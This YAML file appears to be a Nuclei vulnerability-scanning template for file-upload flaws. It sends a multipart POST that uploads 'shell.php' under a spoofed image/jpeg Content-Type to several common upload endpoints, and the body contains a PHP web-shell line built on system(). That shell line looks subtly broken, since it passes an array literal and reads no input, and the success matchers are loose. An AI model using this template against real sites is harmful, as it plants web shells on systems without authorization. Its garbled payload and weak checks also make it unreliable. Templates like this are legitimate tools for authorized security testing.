id: medium-upload-content-type-spoofing-bypass

info:
  name: File Upload - Content-Type Header Spoofing Bypass
  author: elite-red-team
  severity: medium
  description: |
    Detects file upload vulnerabilities where Content-Type header validation can be bypassed through spoofing.
    This template tests various Content-Type spoofing techniques to upload malicious files.
  reference:
    - https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 8.1
    cwe-id: CWE-434
  tags: fileupload,content-type,spoofing,bypass,rce

http:
  - raw:
      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
        
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="file"; filename="shell.php"
        Content-Type: image/jpeg
        
        <?php system(['cmd']); ?>
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

    payloads:
      path:
        - "{{BaseURL}}/upload"
        - "{{BaseURL}}/upload.php"
        - "{{BaseURL}}/fileupload"
        - "{{BaseURL}}/file/upload"
        - "{{BaseURL}}/admin/upload"
        - "{{BaseURL}}/user/upload"

    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 302

      - type: word
        words:
          - "upload"
          - "success"
          - "file"
          - "saved"
          - "uploaded"
        condition: or
        case-insensitive: true

      - type: word
        words:
          - "error"
          - "failed"
          - "invalid"
          - "not allowed"
          - "forbidden"
        condition: or
        case-insensitive: true
        negative: true
